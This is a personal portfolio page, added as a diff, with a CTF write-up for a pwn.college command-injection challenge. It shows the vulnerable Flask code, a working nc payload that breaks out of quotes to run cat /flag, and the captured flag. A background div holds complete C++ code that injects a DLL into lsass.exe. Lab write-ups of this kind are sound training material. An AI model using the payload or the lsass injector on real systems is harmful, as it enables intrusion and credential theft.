@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🧠 Challenge Name: CMDi-3</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🧠 Challenge Name: CMDi-3" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🧠 Challenge Name: CMDi-3</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-category-web-exploitation">🗂 Category: Web Exploitation</h2>
+<p><strong>Platform</strong>: pwn.college<br />
+<strong>Difficulty</strong>: Intermediate<br />
+<strong>Vulnerability</strong>: Command Injection</p>
+
+<hr />
+
+<h2 id="-description">📝 Description</h2>
+
+<p>This challenge features a vulnerable Flask-based web server that lists directories using a user-supplied path. The input is passed into a shell command without proper sanitization. Your objective is to exploit this to retrieve the flag file.</p>
+
+<hr />
+
+<h2 id="-source-code-analysis">🔍 Source Code Analysis</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/activity</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
+    <span class="n">arg</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">dir</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/challenge</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">ls -l </span><span class="sh">'</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="sh">'"</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">DEBUG: </span><span class="si">{</span><span class="n">command</span><span class="o">=</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span>
+        <span class="n">command</span><span class="p">,</span>
+        <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+        <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
+        <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>
+        <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">latin</span><span class="sh">"</span><span class="p">,</span>
+    <span class="p">).</span><span class="n">stdout</span>
+
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+        &lt;html&gt;&lt;body&gt;
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        &lt;form action=</span><span class="sh">"</span><span class="s">/activity</span><span class="sh">"</span><span class="s">&gt;&lt;input type=text name=dir&gt;&lt;input type=submit value=Submit&gt;&lt;/form&gt;
+        &lt;hr&gt;
+        &lt;b&gt;Output of </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">:&lt;/b&gt;&lt;br&gt;
+        &lt;pre&gt;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s">&lt;/pre&gt;
+        &lt;/body&gt;&lt;/html&gt;
+        </span><span class="sh">"""</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="key-vulnerability">Key Vulnerability:</h2>
+<ul>
+  <li>The user input (dir) is directly interpolated inside a shell command.</li>
+  <li>Though it’s wrapped in single quotes, it can still be broken out of using ‘ and shell metacharacters like ;.</li>
+</ul>
+
+<hr />
+
+<h2 id="exploit-strategy">Exploit Strategy</h2>
+
+<h3 id="payload">Payload:</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"GET /activity?dir=/'+;+cat+/flag;' HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n\r\n</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+<h3 id="server-response">Server Response:</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;b&gt;Output of <span class="nb">ls</span> <span class="nt">-l</span> <span class="s1">'/'</span> <span class="p">;</span> <span class="nb">cat</span> /flag<span class="p">;</span><span class="s1">':&lt;/b&gt;&lt;br&gt;
+&lt;pre&gt;total 64
+[...directory listing...]
+pwn.college{U7-y1phaeMq-VVkgC8K7IpcOGa0.QX2YTN2wSM0IzMyEzW}
+/bin/sh: 1: : Permission denied
+&lt;/pre&gt;
+</span></code></pre></div></div>
+<p>The injected cat /flag command executed successfully and returned the flag!</p>
+
+<hr />
+
+<h2 id="flag">Flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college<span class="o">{</span>U7-y1phaeMq-VVkgC8K7IpcOGa0.QX2YTN2wSM0IzMyEzW<span class="o">}</span>
+</code></pre></div></div>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
